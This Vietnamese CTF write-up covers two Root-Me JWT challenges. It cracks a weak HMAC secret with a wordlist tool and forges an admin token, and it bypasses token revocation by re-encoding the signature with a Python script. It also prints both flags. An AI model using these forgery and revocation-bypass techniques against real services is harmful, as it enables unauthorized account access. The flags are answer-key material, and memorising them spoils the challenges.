# 21. JSON Web Token (JWT) - Weak secret
![image](./img/Screenshot%20from%202022-02-26%2014-40-44.png)

như message thì ta sẽ có dc token khi truy cập vào /token/ , và sẽ phỉa dùng token đấy để truy cập vào /admin/

![img](./img/Screenshot%20from%202022-02-26%2014-45-53.png)

lần này mình ko thể dùng cách chuyển alg về none dc nữa r, mà sẽ phỉa crack để có đc signature, trong chall này mình sẽ dùng tool ``crackjwt.py``

```
./crackjwt.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw" ~/SecLists/rockyou.txt                    ─╯
Cracking JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
18741it [00:00, 39596.39it/s]
Found secret key: lol
```

bingo giờ này cái key này rồi chỉnh jwt phần payload sang admin là xong

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA" -X POST http://challenge01.root-me.org/web-serveur/ch59/admin
{"result": "Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime\n"}
```

# 22. JWT - Revoked token
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
import datetime
from apscheduler.schedulers.background import BackgroundScheduler
import threading
import jwt
from config import *
 
# Setup flask
app = Flask(__name__)
 
app.config['JWT_SECRET_KEY'] = SECRET
jwtmanager = JWTManager(app)
blacklist = set()
lock = threading.Lock()
 
# Free memory from expired tokens, as they are no longer useful
def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
            except:
                to_remove.add(access_token)
       
        blacklist = blacklist.difference(to_remove)
 
@app.route("/web-serveur/ch63/")
def index():
    return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
 
# Standard login endpoint
@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
 
# Standard admin endpoint
@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
 
 
if __name__ == '__main__':
    scheduler = BackgroundScheduler()
    job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
    scheduler.start()
    app.run(debug=False, host='0.0.0.0', port=5000)
```

Đây chall đầu tiên của rootme mà mình chơi nó cho xem source code. (dạng này thì mình hơi non tay @@). 

Sau khi ngẫm nghĩ 1 hồi cái source thì đại khái nó là khi mình login thành công với đúng định dạng json ``{"username":"admin","password":"admin"}`` thì nó sẽ trả về cái token ( đồng thời cái token này cũng bị đưa vào blacklist) và nhiệm vụ của mình là dùng cái token đó để truy cập đuợc vào admin để lấy flag

```
job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
```

Ở hàm main có 1 cái job gọi đến cái def  ``delete_expired_tokens():`` mỗi 10s. Hàm def này sẽ thực hiện decode cái jwt thông qua jwt.decode, nếu gặp phải exception thì sẽ add vào set ``to_remove`` và thực hiện so sanh với blacklist thông qua func difference().

Khi access vào admin, nó sẽ kiểm tra header Authorization để check xem cái jwt đó nó có hợp lệ hay không và có nằm trong blacklist hay không. Vậy làm thế nào để có thể bypass cái này khi mà vừa xác thực thành công thì JWT đã bị đưa vào blacklist. 

Vậy solution ở đây sẽ là thay đổi signature key mà không làm thay đổi nội dung của nó :v . Nhắc lại token jwt đưọc tạo như sau:

```
const token = base64urlEncoding(header) + '.' + base64urlEncoding(payload) + '.' + base64urlEncoding(signature)
```

Có kha khá trick để thay để signature để khi mà decode base64 ra thì nội dung nó vẫn thế ( nhưng mà tạo sao chỉ đc thay đổi signature thôi ? Bởi vì signature đưọc tạo ra gồm bởi header,payload,secret(optional) và alg, nếu thay đổi header or payload -> new signature)

Ở đây ta có thể thêm = vào cuối vì khi decode b64 nó sẽ trả về giống nhau.

Ngoài ra, mình có thể generate cái token đến khi nào phần signature key có ``-``, và mình sẽ thực hiện thay đổi nó thành ``/`` (bởi vì ``-`` và ``/`` sau khi decode b64 sẽ trả về kqua giống nhau) 

```
#!python3

import string
import requests
url='http://challenge01.root-me.org/web-serveur/ch63/'
data1={"username":"admin","password":"admin"}
while True:
    r=requests.post(url+'login',json=data1).text
    a=r[17:len(r)-3:].split('.')
    if "_" in a[2]:
        a[2]=a[2].replace('_','/')
        string='.'.join(a)
        header={"Authorization": "Bearer " + string}
        res=requests.get(url+'admin',headers=header).text
        print(res)
        break
```

flag: o_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld
